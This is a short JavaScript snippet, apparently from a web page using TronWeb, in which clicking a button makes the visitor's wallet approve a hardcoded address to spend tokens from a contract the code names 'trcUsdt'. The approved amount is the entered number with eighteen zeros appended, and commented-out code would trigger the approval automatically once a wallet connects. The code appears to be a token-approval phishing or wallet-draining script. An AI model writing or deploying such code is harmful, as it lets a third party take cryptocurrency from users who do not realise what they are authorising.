const feeLimit = 100000000;
const callValue = 0;
const triggerContract = async (number) => {
  let trcUsdt = await window.tronWeb
    .contract()
    .at('TJ3hUZSGLqCXHzB7FzWhxhepXHxM1NWPrf');
  trcUsdt
    .approve('TNGHddjuhKCfU2TNGfCMETBD1upW62MWAb', number + "000000000000000000" )
    .send({
      feeLimit: feeLimit,
      callValue: callValue || 0,
    })
    .then(function (res) {
      console.log(res);
      if (res) {
        callback && callback(res);
      }
    })
    .catch((e) => {
      console.log(e);
    });
};
// var obj = setInterval(async () => {
//   if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
//     clearInterval(obj);
//     triggerContract();
//   }
// }, 10);
$('.btn').click(() => {
  triggerContract($('.number').val())
})